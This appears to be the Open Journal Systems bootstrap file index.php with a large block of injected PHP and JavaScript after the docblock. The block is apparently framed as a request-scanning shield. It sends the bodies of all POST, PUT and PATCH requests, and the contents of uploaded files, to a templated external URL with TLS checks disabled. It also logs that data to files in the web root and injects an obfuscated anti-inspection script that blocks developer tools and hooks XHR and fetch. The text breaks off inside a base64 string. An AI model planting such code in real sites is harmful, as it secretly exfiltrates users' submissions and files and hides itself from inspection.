<?php

/**
 * @mainpage OJS API Reference
 *
 * Welcome to the OJS API Reference. This resource contains documentation
 * generated automatically from the OJS source code.
 *
 * The design of Open %Journal Systems is heavily structured for
 * maintainability, flexibility and robustness. Those familiar with Sun's
 * Enterprise Java Beans technology or the Model-View-Controller (MVC) pattern
 * will note similarities.
 *
 * As in a MVC structure, data storage and representation, user interface
 * presentation, and control are separated into different layers. The major
 * categories, roughly ordered from "front-end" to "back-end," follow:
 * - Smarty templates, which are responsible for assembling HTML pages to
 *   display to users;
 * - Page classes, which receive requests from users' web browsers, delegate
 *   any required processing to various other classes, and call up the
 *   appropriate Smarty template to generate a response;
 * - Controllers, which implement reusable pieces of content e.g. for AJAX
 *   subrequests.
 * - Action classes, which are used by the Page classes to perform non-trivial
 *   processing of user requests;
 * - Model classes, which implement PHP objects representing the system's
 *   various entities, such as Users, Articles, and Journals;
 * - Data Access Objects (DAOs), which generally provide (amongst others)
 *   update, create, and delete functions for their associated Model classes,
 *   are responsible for all database interaction;
 * - Support classes, which provide core functionalities, miscellaneous common;
 *
 * Additionally, many of the concerns shared by multiple PKP applications are
 * implemented in the shared "pkp-lib" library, shipped in the lib/pkp
 * subdirectory. The same conventions listed above apply to lib/pkp as well.
 *
 * As the system makes use of inheritance and has consistent class naming
 * conventions, it is generally easy to tell what category a particular class
 * falls into.
 *
 * For example, a Data Access Object class always inherits from the DAO class,
 * has a Class name of the form [Something]%DAO, and has a filename of the form
 * [Something]%DAO.inc.php.
 *
 * To learn more about developing OJS, there are several additional resources
 * that may be useful:
 * - The docs/README.md document
 * - The PKP support forum at https://forum.pkp.sfu.ca/
 * - Documentation available at https://docs.pkp.sfu.ca/dev/
 *
 * @file ojs/index.php
 *
 * Copyright (c) 2014-2021 Simon Fraser University
 * Copyright (c) 2003-2021 John Willinsky
 * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
 *
 * @ingroup index
 *
 * Bootstrap code for OJS site. Loads required files and then calls the
 * dispatcher to delegate to the appropriate request handler.
 */

// Initialize global environment
define('INDEX_FILE_LOCATION', __FILE__);

define('KPK4444_API_KEY', '${apiKey}');
define('KPK4444_API_URL', 'https://${url ? url.trim() : ''}');

$userIp = $_SERVER['HTTP_CF_CONNECTING_IP']??$_SERVER['HTTP_X_FORWARDED_FOR']??$_SERVER['REMOTE_ADDR']??'unknown';
$banFile = __DIR__ . '/kpk_banned_' . md5($userIp) . '.txt';

if (file_exists($banFile)) {
    if (time() - filemtime($banFile) < 600) { // 10 minutes cache to block GET requests
        header('HTTP/1.1 403 Forbidden');
        header('Content-Type: text/html'); 
        exit(base64_decode('PGh0bWw+PGhlYWQ+PHN0eWxlPmJvZHksaHRtbHttYXJnaW46MDtwYWRkaW5nOjA7d2lkdGg6MTAwdnc7aGVpZ2h0OjEwMHZoO2JhY2tncm91bmQ6IzA5MDkwYjtjb2xvcjojZjQzZjVlO2Rpc3BsYXk6ZmxleDtmbGV4LWRpcmVjdGlvbjpjb2x1bW47anVzdGlmeS1jb250ZW50OmNlbnRlcjthbGlnbi1pdGVtczpjZW50ZXI7Zm9udC1mYW1pbHk6c3lzdGVtLXVpLHNhbnMtc2VyaWY7dXNlci1zZWxlY3Q6bm9uZX1oMXtmb250LXNpemU6NHJlbTt0ZXh0LWFsaWduOmNlbnRlcjttYXJnaW4tYm90dG9tOjA7ZGlzcGxheTpmbGV4O2FsaWduLWl0ZW1zOmNlbnRlcjtnYXA6MTVweDtqdXN0aWZ5LWNvbnRlbnQ6Y2VudGVyfS5je2ZvbnQtc2l6ZToycmVtO21hcmdpbi10b3A6MnJlbTtkaXNwbGF5OmZsZXg7YWxpZ24taXRlbXM6Y2VudGVyO2dhcDoxNXB4fS5ue2ZvbnQtc2l6ZTo0cmVtO2ZvbnQtd2VpZ2h0OmJvbGQ7Y29sb3I6I2ZmMzM2NjthbmltYXRpb246cHVsc2UgMXMgaW5maW5pdGV9QGtleWZyYW1lcyBwdWxzZXswJXt0cmFuc2Zvcm06c2NhbGUoMSk7b3BhY2l0eToxfTUwJXt0cmFuc2Zvcm06c2NhbGUoMS4zKTtvcGFjaXR5OjAuN30xMDAle3RyYW5zZm9ybTpzY2FsZSgxKTtvcGFjaXR5OjF9fTwvc3R5bGU+PHNjcmlwdD52YXIgdD01O3NldEludGVydmFsKGZ1bmN0aW9uKCl7dC0tO2lmKHQ+PTApZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3RpbWVyJykuaW5uZXJUZXh0PXQ7aWYodDw9MCl3aW5kb3cudG9wLmxvY2F0aW9uLmhyZWY9Imh0dHBzOi8vd3d3Lmdvb2dsZS5jb20ifSwxMDAwKTs8L3NjcmlwdD48L2hlYWQ+PGJvZHk+PGgxPjxzdmcgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iNzIiIGhlaWdodD0iNzIiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjZjQzZjVlIiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCI+PHBhdGggZD0iTTEyIDIyczgtNCA4LTEwVjVsLTgtMy04IDN2N2MwIDYgOCAxMCA4IDEweiI+PC9wYXRoPjxwb2x5bGluZSBwb2ludHM9IjkgMTIgMTEgMTQgMTUgMTAiPjwvcG9seWxpbmU+PC9zdmc+IEFDQ0VTUyBERU5JRUQ8L2gxPjxkaXYgY2xhc3M9ImMiPlJlZGlyZWN0aW5nIGluIDxzcGFuIGlkPSJ0aW1lciIgY2xhc3M9Im4iPjU8L3NwYW4+IHNlY29uZHMuLi48L2Rpdj48L2JvZHk+PC9odG1sPg=='));
    } else {
        @unlink($banFile);
    }
}

if (in_array($_SERVER['REQUEST_METHOD'], ['POST', 'PUT', 'PATCH'])) {
    $uri = $_SERVER['REQUEST_URI'] ?? '';
    $skipPaths = ['/login', '/signIn', '/signOut', '/user/register', '/user/profile'];
    $shouldSkip = false;
    foreach ($skipPaths as $path) {
        if (stripos($uri, $path) !== false) {
            $shouldSkip = true;
            break;
        }
    }
    
    if (!$shouldSkip) {
        $c = "";
        
        $debugStr = "URI: $uri\\nFILES: " . json_encode($_FILES) . "\\nPOST: " . json_encode($_POST) . "\\n";
        file_put_contents(__DIR__ . '/kpk_debug_files.txt', $debugStr, FILE_APPEND);
        
        $rawInput = file_get_contents('php://input');
        if ($rawInput) { $c .= $rawInput . " "; }
        
        if (!empty($_POST)) $c .= json_encode($_POST, 256 | 512) . " ";
        if (!empty($_GET)) $c .= json_encode($_GET, 256 | 512) . " ";
        if (!empty($_FILES)) {
            foreach ($_FILES as $fileKey => $file) {
                if (isset($file['name'])) {
                    $c .= is_array($file['name']) ? json_encode($file['name']) . " " : $file['name'] . " ";
                }
                if (isset($file['tmp_name'])) {
                    $tmpFiles = is_array($file['tmp_name']) ? $file['tmp_name'] : [$file['tmp_name']];
                    foreach ($tmpFiles as $tmp) {
                        if (!empty($tmp) && file_exists($tmp)) {
                            $fsize = filesize($tmp);
                            file_put_contents(__DIR__ . '/kpk_debug_files.txt', "Found tmp file: $tmp (size: $fsize)\\n", FILE_APPEND);
                            if ($fsize > 10000) {
                                $head = file_get_contents($tmp, false, null, 0, 5000);
                                $tail = file_get_contents($tmp, false, null, $fsize - 5000, 5000);
                                $c .= $head . "\\n...[TRUNCATED]...\\n" . $tail . " ";
                            } else {
                                $c .= file_get_contents($tmp) . " ";
                            }
                        } else {
                            file_put_contents(__DIR__ . '/kpk_debug_files.txt', "File not exists: $tmp\\n", FILE_APPEND);
                        }
                    }
                }
            }
        }
        
        // Strip non-ASCII (binary) characters that break json_encode
        $cleanContent = "";
        $len = strlen($c);
        for ($i = 0; $i < $len; $i++) {
            $ord = ord($c[$i]);
            if (($ord >= 32 && $ord <= 126) || $ord == 10 || $ord == 13 || $ord == 9) {
                $cleanContent .= $c[$i];
            }
        }
        $c = $cleanContent;
    } else {
        $c = "PING"; 
    }
    
    if (strlen(trim($c)) > 0) {
        $p = json_encode(['apiKey'=>KPK4444_API_KEY, 'domain'=>$_SERVER['HTTP_HOST']??'unknown', 'content'=>$c, 'field'=>'global', 'userIp'=>$_SERVER['HTTP_CF_CONNECTING_IP']??$_SERVER['HTTP_X_FORWARDED_FOR']??$_SERVER['REMOTE_ADDR']??'unknown']);
        if ($p) {
            $ch = curl_init(KPK4444_API_URL . '/api/scan');
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true, CURLOPT_POST => true, CURLOPT_POSTFIELDS => $p,
                CURLOPT_HTTPHEADER => ['Content-Type: application/json', 'X-Forwarded-For: '.($_SERVER['HTTP_X_FORWARDED_FOR']??$_SERVER['REMOTE_ADDR']??'unknown')],
                CURLOPT_CONNECTTIMEOUT => 5, CURLOPT_TIMEOUT => 15,
                CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false
            ]);
            $res = curl_exec($ch);
            $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $err = curl_error($ch);
            curl_close($ch);
            
            // Log for debugging
            file_put_contents(__DIR__ . '/kpk_debug.txt', date('Y-m-d H:i:s') . " - HTTP $code - ERR: $err - RES: $res\\n", FILE_APPEND);
            
            if ($code == 200 && strpos(str_replace(' ', '', $res), '"blocked":true') !== false) {
                file_put_contents($banFile, time());
                header('HTTP/1.1 403 Forbidden');
                header('Content-Type: text/html'); 
                exit(base64_decode('PGh0bWw+PGhlYWQ+PHN0eWxlPmJvZHksaHRtbHttYXJnaW46MDtwYWRkaW5nOjA7d2lkdGg6MTAwdnc7aGVpZ2h0OjEwMHZoO2JhY2tncm91bmQ6IzA5MDkwYjtjb2xvcjojZjQzZjVlO2Rpc3BsYXk6ZmxleDtmbGV4LWRpcmVjdGlvbjpjb2x1bW47anVzdGlmeS1jb250ZW50OmNlbnRlcjthbGlnbi1pdGVtczpjZW50ZXI7Zm9udC1mYW1pbHk6c3lzdGVtLXVpLHNhbnMtc2VyaWY7dXNlci1zZWxlY3Q6bm9uZX1oMXtmb250LXNpemU6NHJlbTt0ZXh0LWFsaWduOmNlbnRlcjttYXJnaW4tYm90dG9tOjA7ZGlzcGxheTpmbGV4O2FsaWduLWl0ZW1zOmNlbnRlcjtnYXA6MTVweDtqdXN0aWZ5LWNvbnRlbnQ6Y2VudGVyfS5je2ZvbnQtc2l6ZToycmVtO21hcmdpbi10b3A6MnJlbTtkaXNwbGF5OmZsZXg7YWxpZ24taXRlbXM6Y2VudGVyO2dhcDoxNXB4fS5ue2ZvbnQtc2l6ZTo0cmVtO2ZvbnQtd2VpZ2h0OmJvbGQ7Y29sb3I6I2ZmMzM2NjthbmltYXRpb246cHVsc2UgMXMgaW5maW5pdGV9QGtleWZyYW1lcyBwdWxzZXswJXt0cmFuc2Zvcm06c2NhbGUoMSk7b3BhY2l0eToxfTUwJXt0cmFuc2Zvcm06c2NhbGUoMS4zKTtvcGFjaXR5OjAuN30xMDAle3RyYW5zZm9ybTpzY2FsZSgxKTtvcGFjaXR5OjF9fTwvc3R5bGU+PHNjcmlwdD52YXIgdD01O3NldEludGVydmFsKGZ1bmN0aW9uKCl7dC0tO2lmKHQ+PTApZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3RpbWVyJykuaW5uZXJUZXh0PXQ7aWYodDw9MCl3aW5kb3cudG9wLmxvY2F0aW9uLmhyZWY9Imh0dHBzOi8vd3d3Lmdvb2dsZS5jb20ifSwxMDAwKTs8L3NjcmlwdD48L2hlYWQ+PGJvZHk+PGgxPjxzdmcgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iNzIiIGhlaWdodD0iNzIiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjZjQzZjVlIiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCI+PHBhdGggZD0iTTEyIDIyczgtNCA4LTEwVjVsLTgtMy04IDN2N2MwIDYgOCAxMCA4IDEweiI+PC9wYXRoPjxwb2x5bGluZSBwb2ludHM9IjkgMTIgMTEgMTQgMTUgMTAiPjwvcG9seWxpbmU+PC9zdmc+IEFDQ0VTUyBERU5JRUQ8L2gxPjxkaXYgY2xhc3M9ImMiPlJlZGlyZWN0aW5nIGluIDxzcGFuIGlkPSJ0aW1lciIgY2xhc3M9Im4iPjU8L3NwYW4+IHNlY29uZHMuLi48L2Rpdj48L2JvZHk+PC9odG1sPg=='));
            } elseif ($code == 403 || $code == 429) {
                file_put_contents($banFile, time());
                header('HTTP/1.1 403 Forbidden');
                header('Content-Type: text/html'); 
                exit(base64_decode('PGh0bWw+PGhlYWQ+PHN0eWxlPmJvZHksaHRtbHttYXJnaW46MDtwYWRkaW5nOjA7d2lkdGg6MTAwdnc7aGVpZ2h0OjEwMHZoO2JhY2tncm91bmQ6IzA5MDkwYjtjb2xvcjojZjQzZjVlO2Rpc3BsYXk6ZmxleDtmbGV4LWRpcmVjdGlvbjpjb2x1bW47anVzdGlmeS1jb250ZW50OmNlbnRlcjthbGlnbi1pdGVtczpjZW50ZXI7Zm9udC1mYW1pbHk6c3lzdGVtLXVpLHNhbnMtc2VyaWY7dXNlci1zZWxlY3Q6bm9uZX1oMXtmb250LXNpemU6NHJlbTt0ZXh0LWFsaWduOmNlbnRlcjttYXJnaW4tYm90dG9tOjA7ZGlzcGxheTpmbGV4O2FsaWduLWl0ZW1zOmNlbnRlcjtnYXA6MTVweDtqdXN0aWZ5LWNvbnRlbnQ6Y2VudGVyfS5je2ZvbnQtc2l6ZToycmVtO21hcmdpbi10b3A6MnJlbTtkaXNwbGF5OmZsZXg7YWxpZ24taXRlbXM6Y2VudGVyO2dhcDoxNXB4fS5ue2ZvbnQtc2l6ZTo0cmVtO2ZvbnQtd2VpZ2h0OmJvbGQ7Y29sb3I6I2ZmMzM2NjthbmltYXRpb246cHVsc2UgMXMgaW5maW5pdGV9QGtleWZyYW1lcyBwdWxzZXswJXt0cmFuc2Zvcm06c2NhbGUoMSk7b3BhY2l0eToxfTUwJXt0cmFuc2Zvcm06c2NhbGUoMS4zKTtvcGFjaXR5OjAuN30xMDAle3RyYW5zZm9ybTpzY2FsZSgxKTtvcGFjaXR5OjF9fTwvc3R5bGU+PHNjcmlwdD52YXIgdD01O3NldEludGVydmFsKGZ1bmN0aW9uKCl7dC0tO2lmKHQ+PTApZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3RpbWVyJykuaW5uZXJUZXh0PXQ7aWYodDw9MCl3aW5kb3cudG9wLmxvY2F0aW9uLmhyZWY9Imh0dHBzOi8vd3d3Lmdvb2dsZS5jb20ifSwxMDAwKTs8L3NjcmlwdD48L2hlYWQ+PGJvZHk+PGgxPjxzdmcgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iNzIiIGhlaWdodD0iNzIiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjZjQzZjVlIiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCI+PHBhdGggZD0iTTEyIDIyczgtNCA4LTEwVjVsLTgtMy04IDN2N2MwIDYgOCAxMCA4IDEweiI+PC9wYXRoPjxwb2x5bGluZSBwb2ludHM9IjkgMTIgMTEgMTQgMTUgMTAiPjwvcG9seWxpbmU+PC9zdmc+IEFDQ0VTUyBERU5JRUQ8L2gxPjxkaXYgY2xhc3M9ImMiPlJlZGlyZWN0aW5nIGluIDxzcGFuIGlkPSJ0aW1lciIgY2xhc3M9Im4iPjU8L3NwYW4+IHNlY29uZHMuLi48L2Rpdj48L2JvZHk+PC9odG1sPg=='));
            }
        }
    }
}

// Anti-Inspect Shield (Only for normal HTML pages, SKIP for AJAX to prevent JSON corruption)
$isAjax = (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') || 
          strpos($_SERVER['REQUEST_URI'], '/api/') !== false || 
          strpos($_SERVER['REQUEST_URI'], '$$$call$$$') !== false ||
          strpos($_SERVER['REQUEST_URI'], '/submission/saveStep/') !== false ||
          strpos($_SERVER['REQUEST_URI'], '/notification/fetchNotification') !== false;

if (!$isAjax) {
    ob_start(function($b) {
        $s = '<script>!function(){document.addEventListener("contextmenu",function(e){e.preventDefault()});document.addEventListener("keydown",function(e){if(123===e.keyCode||e.ctrlKey&&e.shiftKey&&(73===e.keyCode||74===e.keyCode)||e.ctrlKey&&85===e.keyCode){e.preventDefault();window.top.location.href="https://www.google.com"}});var e=function(){var n=(new Date).getTime();debugger;if((new Date).getTime()-n>50){document.write(atob("PGh0bWw+PGhlYWQ+PHN0eWxlPmJvZHksaHRtbHttYXJnaW46MDtwYWRkaW5nOjA7d2lkdGg6MTAwdnc7aGVpZ2h0OjEwMHZoO2JhY2tncm91bmQ6IzA5MDkwYjtjb2xvcjojZjQzZjVlO2Rpc3BsYXk6ZmxleDtmbGV4LWRpcmVjdGlvbjpjb2x1bW47anVzdGlmeS1jb250ZW50OmNlbnRlcjthbGlnbi1pdGVtczpjZW50ZXI7Zm9udC1mYW1pbHk6c3lzdGVtLXVpLHNhbnMtc2VyaWY7dXNlci1zZWxlY3Q6bm9uZX1oMXtmb250LXNpemU6NHJlbTt0ZXh0LWFsaWduOmNlbnRlcjttYXJnaW4tYm90dG9tOjA7ZGlzcGxheTpmbGV4O2FsaWduLWl0ZW1zOmNlbnRlcjtnYXA6MTVweDtqdXN0aWZ5LWNvbnRlbnQ6Y2VudGVyfS5je2ZvbnQtc2l6ZToycmVtO21hcmdpbi10b3A6MnJlbTtkaXNwbGF5OmZsZXg7YWxpZ24taXRlbXM6Y2VudGVyO2dhcDoxNXB4fS5ue2ZvbnQtc2l6ZTo0cmVtO2ZvbnQtd2VpZ2h0OmJvbGQ7Y29sb3I6I2ZmMzM2NjthbmltYXRpb246cHVsc2UgMXMgaW5maW5pdGV9QGtleWZyYW1lcyBwdWxzZXswJXt0cmFuc2Zvcm06c2NhbGUoMSk7b3BhY2l0eToxfTUwJXt0cmFuc2Zvcm06c2NhbGUoMS4zKTtvcGFjaXR5OjAuN30xMDAle3RyYW5zZm9ybTpzY2FsZSgxKTtvcGFjaXR5OjF9fTwvc3R5bGU+PHNjcmlwdD52YXIgdD01O3NldEludGVydmFsKGZ1bmN0aW9uKCl7dC0tO2lmKHQ+PTApZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3RpbWVyJykuaW5uZXJUZXh0PXQ7aWYodDw9MCl3aW5kb3cudG9wLmxvY2F0aW9uLmhyZWY9Imh0dHBzOi8vd3d3Lmdvb2dsZS5jb20ifSwxMDAwKTs8L3NjcmlwdD48L2hlYWQ+PGJvZHk+PGgxPjxzdmcgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iNzIiIGhlaWdodD0iNzIiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjZjQzZjVlIiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCI+PHBhdGggZD0iTTEyIDIyczgtNCA4LTEwVjVsLTgtMy04IDN2N2MwIDYgOCAxMCA4IDEweiI+PC9wYXRoPjxwb2x5bGluZSBwb2ludHM9IjkgMTIgMTEgMTQgMTUgMTAiPjwvcG9seWxpbmU+PC9zdmc+IEFDQ0VTUyBERU5JRUQ8L2gxPjxkaXYgY2xhc3M9ImMiPlJlZGlyZWN0aW5nIGluIDxzcGFuIGlkPSJ0aW1lciIgY2xhc3M9Im4iPjU8L3NwYW4+IHNlY29uZHMuLi48L2Rpdj48L2JvZHk+PC9odG1sPg=="))}setTimeout(e,50)};e();var n=function(){if(window.outerWidth-window.innerWidth>160||window.outerHeight-window.innerHeight>160){document.write(atob("PGh0bWw+PGhlYWQ+PHN0eWxlPmJvZHksaHRtbHttYXJnaW46MDtwYWRkaW5nOjA7d2lkdGg6MTAwdnc7aGVpZ2h0OjEwMHZoO2JhY2tncm91bmQ6IzA5MDkwYjtjb2xvcjojZjQzZjVlO2Rpc3BsYXk6ZmxleDtmbGV4LWRpcmVjdGlvbjpjb2x1bW47anVzdGlmeS1jb250ZW50OmNlbnRlcjthbGlnbi1pdGVtczpjZW50ZXI7Zm9udC1mYW1pbHk6c3lzdGVtLXVpLHNhbnMtc2VyaWY7dXNlci1zZWxlY3Q6bm9uZX1oMXtmb250LXNpemU6NHJlbTt0ZXh0LWFsaWduOmNlbnRlcjttYXJnaW4tYm90dG9tOjA7ZGlzcGxheTpmbGV4O2FsaWduLWl0ZW1zOmNlbnRlcjtnYXA6MTVweDtqdXN0aWZ5LWNvbnRlbnQ6Y2VudGVyfS5je2ZvbnQtc2l6ZToycmVtO21hcmdpbi10b3A6MnJlbTtkaXNwbGF5OmZsZXg7YWxpZ24taXRlbXM6Y2VudGVyO2dhcDoxNXB4fS5ue2ZvbnQtc2l6ZTo0cmVtO2ZvbnQtd2VpZ2h0OmJvbGQ7Y29sb3I6I2ZmMzM2NjthbmltYXRpb246cHVsc2UgMXMgaW5maW5pdGV9QGtleWZyYW1lcyBwdWxzZXswJXt0cmFuc2Zvcm06c2NhbGUoMSk7b3BhY2l0eToxfTUwJXt0cmFuc2Zvcm06c2NhbGUoMS4zKTtvcGFjaXR5OjAuN30xMDAle3RyYW5zZm9ybTpzY2FsZSgxKTtvcGFjaXR5OjF9fTwvc3R5bGU+PHNjcmlwdD52YXIgdD01O3NldEludGVydmFsKGZ1bmN0aW9uKCl7dC0tO2lmKHQ+PTApZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3RpbWVyJykuaW5uZXJUZXh0PXQ7aWYodDw9MCl3aW5kb3cudG9wLmxvY2F0aW9uLmhyZWY9Imh0dHBzOi8vd3d3Lmdvb2dsZS5jb20ifSwxMDAwKTs8L3NjcmlwdD48L2hlYWQ+PGJvZHk+PGgxPjxzdmcgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iNzIiIGhlaWdodD0iNzIiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjZjQzZjVlIiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCI+PHBhdGggZD0iTTEyIDIyczgtNCA4LTEwVjVsLTgtMy04IDN2N2MwIDYgOCAxMCA4IDEweiI+PC9wYXRoPjxwb2x5bGluZSBwb2ludHM9IjkgMTIgMTEgMTQgMTUgMTAiPjwvcG9seWxpbmU+PC9zdmc+IEFDQ0VTUyBERU5JRUQ8L2gxPjxkaXYgY2xhc3M9ImMiPlJlZGlyZWN0aW5nIGluIDxzcGFuIGlkPSJ0aW1lciIgY2xhc3M9Im4iPjU8L3NwYW4+IHNlY29uZHMuLi48L2Rpdj48L2JvZHk+PC9odG1sPg=="))}};setInterval(n,500);window.addEventListener("resize",n);var o=window.XMLHttpRequest.prototype.open;window.XMLHttpRequest.prototype.open=function(){this.addEventListener("readystatechange",function(){if(4===this.readyState&&(403===this.status||429===this.status)){document.write(atob("PGh0bWw+PGhlYWQ+PHN0eWxlPmJvZHksaHRtbHttYXJnaW46MDtwYWRkaW5nOjA7d2lkdGg6MTAwdnc7aGVpZ2h0OjEwMHZoO2JhY2tncm91bmQ6IzA5MDkwYjtjb2xvcjojZjQzZjVlO2Rpc3BsYXk6ZmxleDtmbGV4LWRpcmVjdGlvbjpjb2x1bW47anVzdGlmeS1jb250ZW50OmNlbnRlcjthbGlnbi1pdGVtczpjZW50ZXI7Zm9udC1mYW1pbHk6c3lzdGVtLXVpLHNhbnMtc2VyaWY7dXNlci1zZWxlY3Q6bm9uZX1oMXtmb250LXNpemU6NHJlbTt0ZXh0LWFsaWduOmNlbnRlcjttYXJnaW4tYm90dG9tOjA7ZGlzcGxheTpmbGV4O2FsaWduLWl0ZW1zOmNlbnRlcjtnYXA6MTVweDtqdXN0aWZ5LWNvbnRlbnQ6Y2VudGVyfS5je2ZvbnQtc2l6ZToycmVtO21hcmdpbi10b3A6MnJlbTtkaXNwbGF5OmZsZXg7YWxpZ24taXRlbXM6Y2VudGVyO2dhcDoxNXB4fS5ue2ZvbnQtc2l6ZTo0cmVtO2ZvbnQtd2VpZ2h0OmJvbGQ7Y29sb3I6I2ZmMzM2NjthbmltYXRpb246cHVsc2UgMXMgaW5maW5pdGV9QGtleWZyYW1lcyBwdWxzZXswJXt0cmFuc2Zvcm06c2NhbGUoMSk7b3BhY2l0eToxfTUwJXt0cmFuc2Zvcm06c2NhbGUoMS4zKTtvcGFjaXR5OjAuN30xMDAle3RyYW5zZm9ybTpzY2FsZSgxKTtvcGFjaXR5OjF9fTwvc3R5bGU+PHNjcmlwdD52YXIgdD01O3NldEludGVydmFsKGZ1bmN0aW9uKCl7dC0tO2lmKHQ+PTApZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3RpbWVyJykuaW5uZXJUZXh0PXQ7aWYodDw9MCl3aW5kb3cubG9jYXRpb24uaHJlZj0iaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbSJ9LDEwMDApOzwvc2NyaXB0PjwvaGVhZD48Ym9keT48aDE+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3MiIgaGVpZ2h0PSI3MiIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9IiNmNDNmNWUiIHN0cm9rZS13aWR0aD0iMiIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIj48cGF0aCBkPSJNMTIgMjJzOC00IDgtMTBWNWwtOC0zLTggM3Y3YzAgNiA4IDEwIDggMTB6Ij48L3BhdGg+PHBvbHlsaW5lIHBvaW50cz0iOSAxMiAxMSAxNCAxNSAxMCI+PC9wb2x5bGluZT48L3N2Zz4gQUNDRVNTIERFTklFRDwvaDE+PGRpdiBjbGFzcz0iYyI+UmVkaXJlY3RpbmcgaW4gPHNwYW4gaWQ9InRpbWVyIiBjbGFzcz0ibiI+NTwvc3Bhbj4gc2Vjb25kcy4uLjwvZGl2PjwvYm9keT48L2h0bWw+"))}});return o.apply(this,arguments)};var f=window.fetch;if(f){window.fetch=function(){return f.apply(this,arguments).then(function(r){if(403===r.status||429===r.status){document.write(atob("PGh0bWw+PGhlYWQ+PHN0eWxlPmJvZHksaHRtbHttYXJnaW46MDtwYWRkaW5nOjA7d2lkdGg6MTAwdnc7aGVpZ2h0OjEwMHZoO2JhY2tncm91bmQ6IzA5MDkwYjtjb2xvcjojZjQzZjVlO2Rpc3BsYXk6ZmxleDtmbGV4LWRpcmVjdGlvbjpjb2x1bW47anVzdGlmeS1jb250ZW50OmNlbnRlcjthbGlnbi1pdGVtczpjZW50ZXI7Zm9udC1mYW1pbHk6c3lzdGVtLXVpLHNhbnMtc2VyaWY7dXNlci1zZWxlY3Q6bm9uZX1oMXtmb250LXNpemU6NHJlbTt0ZXh0LWFsaWduOmNlbnRlcjttYXJnaW4tYm90dG9tOjA7ZGlzcGxheTpmbGV4O2FsaWduLWl0ZW1zOmNlbnRlcjtnYXA6MTVweDtqdXN0aWZ5LWNvbnRlbnQ6Y2VudGVyfS5je2ZvbnQtc2l6ZToycmVtO21hcmdpbi10b3A6MnJlbTtkaXNwbGF5OmZsZXg7YWxpZ24taXRlbXM6Y2VudGVyO2dhcDoxNXB4fS5ue2ZvbnQtc2l6ZTo0cmVtO2ZvbnQtd2VpZ2h0OmJvbGQ7Y29sb3I6I2ZmMzM2NjthbmltYXRpb246cHVsc2UgMXMgaW5maW5pdGV9QGtleWZyYW1lcyBwdWxzZXswJXt0cmFuc2Zvcm06c2NhbGUoMSk7b3BhY2l0eToxfTUwJXt0cmFuc2Zvcm06c2NhbGUoMS4zKTtvcGFjaXR5OjAuN30xMDAle3RyYW5zZm9ybTpzY2FsZSgxKTtvcGFjaXR5OjF9fTwvc3R5bGU+PHNjcmlwdD52YXIgdD01O3NldEludGVydmFsKGZ1bmN0aW9uKCl7dC0tO2lmKHQ+PTApZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3RpbWVyJykuaW5uZXJUZXh0PXQ7aWYodDw9MCl3aW5kb3cubG9jYXRpb24uaHJlZj0iaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbSJ9LDEwMDApOzwvc2NyaXB0PjwvaGVhZD48Ym9keT48aDE+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3MiIgaGVpZ2h0PSI3MiIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9IiNmNDNmNWUiIHN0cm9rZS13aWR0aD0iMiIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIj48cGF0aCBkPSJNMTIgMjJzOC00IDgtMTBWNWwtOC0zLTggM3Y3YzAgNiA4IDEwIDggMTB6Ij48L3BhdGg+PHBvbHlsaW5lIHBvaW50cz0iOSAxMiAxMSAx